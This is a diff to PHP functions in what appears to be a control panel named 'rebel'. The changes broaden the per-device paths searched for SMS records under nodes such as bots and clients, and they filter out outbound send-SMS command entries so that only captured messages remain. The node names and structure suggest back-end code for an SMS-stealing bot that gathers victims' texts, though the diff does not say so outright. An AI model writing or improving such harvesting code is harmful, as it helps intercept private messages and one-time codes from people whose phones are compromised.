@@ -290,16 +290,20 @@ function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', 
     }
 
     if ($schema === 'rabel' || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
-        array_unshift($paths, 'sms_backup/' . $id);
-        array_unshift($paths, 'user_sms/' . $id);
-        $paths[] = 'messages/' . $id;
-        $paths[] = 'sms/' . $id;
-        $junkNodes = ['clients', 'users', 'data', 'sendsms', 'bots', 'Admin', 'admin'];
+        $paths = [
+            'user_sms/' . $id,
+            'sms_backup/' . $id,
+            'messages/' . $id,
+            'sms/' . $id,
+            'all_sms/' . $id,
+            'new_sms/' . $id,
+        ];
+        $junkNodes = ['clients', 'users', 'data', 'sendsms', 'sendSms', 'smsQueue', 'bots', 'Admin', 'admin'];
         foreach ($bases as $n) {
-            if ($n === '' || $n === 'user_sms' || in_array($n, $junkNodes, true)) {
+            if ($n === '' || in_array($n, $junkNodes, true)) {
                 continue;
             }
-            foreach ($suffixes as $sfx) {
+            foreach (['all_sms', 'new_sms', 'sms', 'messages'] as $sfx) {
                 $paths[] = $n . '/' . $id . '/' . $sfx;
             }
         }
@@ -551,14 +555,37 @@ function rebel_sms_msg_time(array $m): int
     return rebel_sms_to_ms($m['date_readable'] ?? null);
 }
 
+function rebel_sms_is_outbound_command(array $m): bool
+{
+    if (!empty($m['sender']) || !empty($m['address']) || !empty($m['originatingAddress'])) {
+        return false;
+    }
+    if (!empty($m['body']) && (isset($m['sender']) || isset($m['address']))) {
+        return false;
+    }
+    if (!empty($m['to']) && !empty($m['status']) && empty($m['body']) && (!empty($m['message']) || !empty($m['msg']))) {
+        return true;
+    }
+    if (!empty($m['to']) && (!empty($m['message']) || !empty($m['msg'])) && empty($m['body']) && empty($m['sender']) && empty($m['date']) && empty($m['timestamp'])) {
+        return true;
+    }
+    return false;
+}
+
 /** Normalize SMS record — same fields as rebel.py + panel normalizeSms() */
 function rebel_sms_normalize($m): ?array
 {
     if (!is_array($m)) {
         return null;
     }
+    if (rebel_sms_is_outbound_command($m)) {
+        return null;
+    }
     $body = trim((string)($m['body'] ?? $m['message'] ?? $m['text'] ?? $m['content'] ?? $m['msg'] ?? ''));
     if ($body === '') {
+        return null;
+    }
+    if (empty($m['body']) && !empty($m['message']) && !empty($m['to']) && !empty($m['status']) && empty($m['sender'])) {
         return null;
     }
     $ts = rebel_sms_msg_time($m);
